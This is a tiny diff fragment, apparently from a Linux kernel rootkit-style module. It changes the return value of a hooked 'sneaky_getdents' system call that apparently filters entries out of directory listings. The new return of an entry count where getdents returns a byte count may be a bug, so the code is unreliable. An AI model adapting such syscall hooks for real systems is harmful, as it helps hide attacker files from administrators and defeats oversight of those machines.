@@ -111,7 +111,7 @@ asmlinkage int sneaky_getdents (unsigned int fd,
     }
   }
   
-  return dirent_size - skipped_size;
+  return dirent_num - skipped_num;
 }
 
 
